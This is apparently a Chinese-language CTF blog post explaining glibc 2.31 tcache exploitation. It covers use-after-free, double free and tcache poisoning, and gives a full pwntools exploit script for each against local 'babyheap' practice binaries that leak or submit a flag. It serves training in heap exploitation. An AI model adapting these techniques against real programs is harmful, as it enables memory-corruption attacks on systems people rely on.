---
layout: post
tags: [pwn]
title: "glibc2.31 利用手法"
author: wsxk
date: 2025-3-1
comments: true
---

- [1. tcache](#1-tcache)
  - [1.1 uaf(use after free)](#11-uafuse-after-free)
  - [1.2 double free](#12-double-free)
  - [1.3 tcache poisoning](#13-tcache-poisoning)

# 1. tcache<br>
tcachebin的大小在0x20~0x408之间。<br>
## 1.1 uaf(use after free)<br>
常用的 tcache uaf是指，**分配一个内存A，由ptr指向；释放后ptr并没有置空；此时分配内存时再利用又分配了内存A，往其中写入机密信息；此时可皆由ptr来读出机密信息**<br>
```python
from pwn import *
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

binary_path = "./babyheap_level2.1"
libc_path = "./libc.so.6"

p = process(binary_path)


def malloc(size):
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"free")
    return

def read_flag():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"read_flag")
    return

def puts():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"puts")
    return

read_flag()
p.recvuntil(b"[*] flag_buffer = ")
chunk_addr1 = int(p.recvline().strip(b"\n"),16)
log.success(f"chunk_size:{hex(chunk_addr1)}")
read_flag()
p.recvuntil(b"[*] flag_buffer = ")
chunk_addr2 = int(p.recvline().strip(b"\n"),16)
log.success(f"chunk_size:{hex(chunk_addr2)}")

chunk_size = chunk_addr2 - chunk_addr1 -0x10
malloc(chunk_size)
free()
read_flag()
puts()#uaf

p.interactive()
```

## 1.2 double free<br>
tcache double free要想成功实施，**首先需要有一个uaf漏洞，让你在释放内存A后，仍然可以往A写内容，改变其第8~16字节的值。**<br>
```python
from pwn import *
context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

binary_path = "./babyheap_level4.1"
libc_path = "./libc.so.6"

p = process(binary_path)

def malloc(size):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/read_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free():
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/read_flag/quit): ")
    p.sendline(b"free")
    return

def read_flag():
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/read_flag/quit): ")
    p.sendline(b"read_flag")
    return

def puts():
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/read_flag/quit): ")
    p.sendline(b"puts")
    return

def scanf(string):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/read_flag/quit): ")
    p.sendline(b"scanf")
    # p.recvuntil(b"allocations")
    p.sendline(string)
    return

malloc(0x2FA)
free()
scanf(b"a"*16) # uaf
free() # double free
read_flag()
puts()
p.interactive()
```
## 1.3 tcache poisoning<br>
tcache poisoning 的核心思想是 **改变tcache bin中的链表结构，比如 a->b，修改后变为a->c**<br>
```python
from pwn import *
context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

binary_path = "./babyheap_level7.0"
libc_path = "./libc.so.6"

p = process(binary_path,env={"LD_PRELOAD":libc_path})

def malloc(idx,size):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free(idx):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"free")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    return

def puts(idx):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"puts")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    return

def scanf(idx,content):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"scanf")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.sendline(content)
    return 

def send_flag(secret):
    p.recvuntil(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ")
    p.sendline(b"send_flag")
    p.recvuntil(b"Secret: ")
    p.sendline(secret)
    return

malloc(0,0x20)
malloc(1,0x20)
free(0) 
free(1)   # 1-> 0 
scanf(1,p64(0x425A51)) # uaf to achieve tcache_poisoning, now 1 -> 0x425a51
malloc(2,0x20)
malloc(3,0x20)
puts(3)
p.recvuntil(b"Data: ")
secret = p.recv(8)
log.info(f"secret: {secret}")
send_flag(secret+b"\x00"*8)  # malloc will cause chunk->key = 0

p.interactive()
```



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>

